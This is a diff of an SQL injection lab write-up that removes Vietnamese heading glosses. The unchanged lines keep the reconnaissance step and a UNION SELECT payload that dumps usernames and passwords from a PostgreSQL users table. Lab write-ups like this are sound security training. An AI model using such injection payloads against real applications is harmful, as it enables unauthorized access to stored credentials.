@@ -2,7 +2,7 @@
 
 **Lab Description:** This lab contains an SQL injection vulnerability in the product category filter. The application runs on a PostgreSQL database.
 
-## 1. Reconnaissance (Trinh sát)
+## 1. Reconnaissance
 * **Detection:** Appended `'` to the URL parameter `category`.(same previous lab)
     * Result: `Internal Server Error` (500).
     * Conclusion: Likely SQL Injection.
@@ -31,7 +31,7 @@ Payload:
 ```
 -> Found columns: username_hgkkrs, password_uyfqhi
 
-**Step4: Dump Data (Lấy mật khẩu) Payload:**
+**Step4: Dump Data Payload:**
 ```sql
 ' UNION SELECT username_hgkkrs, password_uyfqhi FROM users_yrspka--
 ```
